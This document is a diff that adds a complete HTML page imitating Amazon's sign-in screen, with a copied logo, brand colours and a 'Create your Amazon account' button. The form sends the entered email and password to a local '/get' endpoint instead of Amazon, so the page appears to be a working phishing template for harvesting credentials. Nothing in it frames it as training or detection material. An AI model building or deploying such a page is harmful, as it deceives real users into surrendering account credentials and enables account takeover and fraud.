@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Amazon</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
+.card{width:100%;max-width:380px}
+.logo{text-align:center;margin-bottom:16px}
+.logo svg{width:100px;height:32px}
+h1{font-size:24px;font-weight:400;color:#111;margin-bottom:16px}
+.form-group{margin-bottom:14px}
+.form-group label{display:block;font-size:13px;font-weight:700;color:#111;margin-bottom:4px}
+.form-group input{width:100%;padding:10px 12px;border:1px solid #a6a6a6;border-radius:4px;font-size:14px;outline:none}
+.form-group input:focus{border-color:#e77600;box-shadow:0 0 3px 2px rgba(228,121,17,0.5)}
+.btn{width:100%;padding:10px;background:#ffd814;border:1px solid #fcd200;border-radius:8px;font-size:14px;cursor:pointer;transition:background .2s}
+.btn:hover{background:#f7ca00}
+.btn:active{transform:scale(0.98)}
+.keep{display:flex;align-items:center;gap:8px;margin:12px 0;font-size:13px;color:#555}
+.keep input{accent-color:#e77600}
+.help{display:block;text-align:center;margin-top:12px;color:#0066c0;font-size:13px;text-decoration:none}
+.divider{position:relative;text-align:center;margin:20px 0;color:#767676;font-size:12px}
+.divider::before{content:'';position:absolute;top:50%;left:0;right:0;border-top:1px solid #e7e7e7}
+.divider span{background:#fff;padding:0 10px;position:relative}
+.create-btn{width:100%;padding:10px;background:#fff;border:1px solid #888;border-radius:8px;font-size:13px;cursor:pointer;margin-top:4px}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo">
+<svg viewBox="0 0 100 32" fill="none"><text x="0" y="24" font-size="22" font-weight="700" fill="#232f3e" font-family="Arial">amazon</text><path d="M10 28c12 4 26 4 38-1" stroke="#ff9900" stroke-width="2.5" stroke-linecap="round"/><path d="M44 24l4 3-6 1" fill="#ff9900"/></svg>
+</div>
+<h1>Sign in</h1>
+<form action="/get" method="POST">
+<div class="form-group">
+<label>Email or mobile phone number</label>
+<input name="email" type="text" required autocomplete="off">
+</div>
+<div class="form-group">
+<label>Password</label>
+<input name="password" type="password" required autocomplete="off">
+</div>
+<button type="submit" class="btn">Sign in</button>
+<div class="keep"><input type="checkbox" checked>Keep me signed in</div>
+<a href="#" class="help">Forgot your password?</a>
+</form>
+<div class="divider"><span>New to Amazon?</span></div>
+<button class="create-btn">Create your Amazon account</button>
+</div>
+</body>
+</html>
